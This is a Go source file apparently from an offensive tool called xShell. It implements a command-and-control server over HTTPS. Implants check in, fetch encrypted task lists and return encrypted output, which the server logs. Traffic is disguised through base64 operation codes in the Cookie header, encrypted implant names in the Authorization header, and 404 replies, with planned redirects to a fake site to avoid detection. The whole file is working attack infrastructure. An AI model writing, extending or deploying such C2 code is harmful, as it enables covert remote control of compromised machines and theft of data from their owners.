package c2

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"time"
	"xShell/controller/logger"

	rn "github.com/random-names/go"
	"golang.org/x/text/cases"
	"golang.org/x/text/language"
)

/*
C2 struct

Type -> C2 listener type

Port -> C2 listener port

CertFile -> HTTPS C2 TLS certificate

KeyFile -> HTTPS C2 TLS key

Key -> Serpent cipher key

Uptime -> C2 listener uptime (unix time)
*/
type C2 struct {
	Type     string `default:"https"` // Reserved for future use...
	Port     string
	CertFile string
	KeyFile  string
	Key      []byte
	Uptime   int64
}

/*
Gets shell name from request

Gets "Authorization" header, base64 decodes the value, then decrypts it.

Return -> Shell name, error
*/
func (c *C2) getShellName(r *http.Request) (string, error) {
	// Get shell name from "Authorization" header, this will be encrypted and base64 encoded
	b64EncryptedShellName := r.Header.Get("Authorization")
	// Return error if header not set
	if b64EncryptedShellName == "" {
		return "", fmt.Errorf("authorization header not set")
	}
	// Decode shell name from base64
	encryptedShellName, err := base64.StdEncoding.DecodeString(b64EncryptedShellName)
	if err != nil {
		return "", nil
	}
	// Decrypt shell name
	shellName, err := SerpentDecrypt(encryptedShellName, c.Key)
	if err != nil {
		return "", nil
	}
	return string(shellName), nil
}

/*
Handles shell check in
*/
func (c *C2) checkInHandler(w http.ResponseWriter, r *http.Request) {
	// Generate shell name
	adjective, err := rn.GetRandomName("heroku/adj", &rn.Options{})
	if err != nil {
		logger.Log(logger.ERROR, err.Error())
		// We need to set the name to something
		adjective = "default"
	}
	noun, err := rn.GetRandomName("heroku/noun", &rn.Options{})
	if err != nil {
		logger.Log(logger.ERROR, err.Error())
		// We need to set the name to something
		noun = "default"
	}
	// Format shell name, make first letter of each word uppercase
	shellName := fmt.Sprintf("%s%s", cases.Title(language.English, cases.NoLower).String(adjective), cases.Title(language.English, cases.NoLower).String(noun))
	// Get shells ip address
	ip, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		logger.Log(logger.ERROR, err.Error())
		// TODO: Redirect to fake site
		w.WriteHeader(http.StatusNotFound)
		return
	}
	// Add shell to shell map
	ShellMap.Add(&Shell{
		Id:       shellName,
		Ip:       ip,
		LastCall: time.Now().Unix(),
		Tasks:    make([]*Task, 0),
	})
	// Check if log file exists, if not create it
	if _, err := os.Stat(filepath.Join(".xshell", fmt.Sprintf("%s.log", shellName))); err != nil {
		os.Mkdir(filepath.Join(".xshell", fmt.Sprintf("%s.log", shellName)), 0700)
	}
	// Encrypt shell name
	encShellName, err := SerpentEncrypt([]byte(shellName), c.Key)
	if err != nil {
		logger.Log(logger.ERROR, err.Error())
		// TODO: Redirect to fake site
		w.WriteHeader(http.StatusNotFound)
		return
	}
	// Send encrypted shell name to shell
	w.Write(encShellName)
}

/*
Shell task handler
*/
func (c *C2) taskHandler(w http.ResponseWriter, r *http.Request) {
	// Get shell name
	shellName, err := c.getShellName(r)
	if err != nil {
		logger.Log(logger.ERROR, err.Error())
		// TODO: Redirect to fake site
		w.WriteHeader(http.StatusNotFound)
		return
	}
	// Check that shell exists in shell map
	if shell, ok := ShellMap.Get(shellName); ok {
		// Update last call time
		shell.LastCall = time.Now().Unix()
		// json marshall tasks
		jsonTasks, err := json.Marshal(shell.Tasks)
		if err != nil {
			logger.Log(logger.ERROR, err.Error())
			// TODO: Redirect to fake site
			w.WriteHeader(http.StatusNotFound)
			return
		}
		encryptedJsonTasks, err := SerpentEncrypt(jsonTasks, c.Key)
		if err != nil {
			logger.Log(logger.ERROR, err.Error())
			// TODO: Redirect to fake site
			w.WriteHeader(http.StatusNotFound)
			return
		}
		w.Write(encryptedJsonTasks)
	} else {
		// TODO: Redirect to fake site
		w.WriteHeader(http.StatusNotFound)
	}
}

/*
Shell call back handler
*/
func (c *C2) callBackHandler(w http.ResponseWriter, r *http.Request) {
	// Get shell name
	shellName, err := c.getShellName(r)
	if err != nil {
		logger.Log(logger.ERROR, err.Error())
		// TODO: Redirect to fake site
		w.WriteHeader(http.StatusNotFound)
		return
	}
	// Check that shell exists in shell map
	if shell, ok := ShellMap.Get(shellName); ok {
		// Get request body
		body, err := io.ReadAll(r.Body)
		if err != nil {
			logger.Log(logger.ERROR, err.Error())
			// TODO: Redirect to fake site
			w.WriteHeader(http.StatusNotFound)
			return
		}
		// Close request body reader
		r.Body.Close()
		// Check if the body is empty
		if body == nil {
			logger.Log(logger.INFO, "Request body is empty")
			// TODO: Redirect to fake site
			w.WriteHeader(http.StatusNotFound)
			return
		}
		// Decrypt body data
		decrypedBody, err := SerpentDecrypt(body, c.Key)
		if err != nil {
			logger.Log(logger.ERROR, err.Error())
			// TODO: Redirect to fake site
			w.WriteHeader(http.StatusNotFound)
			return
		}
		// Open shell log file
		logFile, err := os.OpenFile(filepath.Join(".xshell", fmt.Sprintf("%s.log", shellName)), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			logger.Log(logger.ERROR, err.Error())
			// TODO: Redirect to fake site
			w.WriteHeader(http.StatusNotFound)
			return
		}
		// Close log file on return
		defer logFile.Close()
		// Write data to log file
		_, err = logFile.WriteString(string(decrypedBody))
		if err != nil {
			logger.Log(logger.ERROR, err.Error())
			// TODO: Redirect to fake site
			w.WriteHeader(http.StatusNotFound)
			return
		}
		// Update last call time
		shell.LastCall = time.Now().Unix()
		return
	} else {
		// TODO: Redirect to fake site
		w.WriteHeader(http.StatusNotFound)
	}
}

/*
Catch-all route handler

Switches based on requested operation.

Requested operation is stored in the "Cookie" header.
*/
func (c *C2) handler(w http.ResponseWriter, r *http.Request) {
	if op := r.Header.Get("Cookie"); op != "" {
		switch op {
		case "Q2hlY2tJbg==": // CheckIn
			c.checkInHandler(w, r)
		case "R2V0VGFza3M=": // GetTasks
			c.taskHandler(w, r)
		case "Q2FsbEJhY2s=": // CallBack
			c.callBackHandler(w, r)
		default:
			// TODO: Redirect to fake site
			w.WriteHeader(http.StatusNotFound)
		}
	}
}

/*
Start C2
*/
func (c *C2) Start() {
	// Start time is now
	c.Uptime = time.Now().Unix()
	switch c.Type {
	case "https": // https C2 channel
		// Catch-all route handler
		http.Handle("/", logRequest(http.HandlerFunc(c.handler)))

		// Http server object
		server := &http.Server{
			Addr: fmt.Sprintf("0.0.0.0:%s", c.Port),
		}
		// Server http server with TLS
		err := server.ListenAndServeTLS(c.CertFile, c.KeyFile)
		if err != nil {
			logger.Log(logger.CRITICAL, fmt.Sprintf("Server failed to start: %v", err))
			log.Fatal(err)
		}
	}
}

// Log handler, logs request
func logRequest(handler http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		logger.Log(logger.INFO, fmt.Sprintf("Received request %s %s", r.Method, r.URL))
		handler.ServeHTTP(w, r)
	})
}
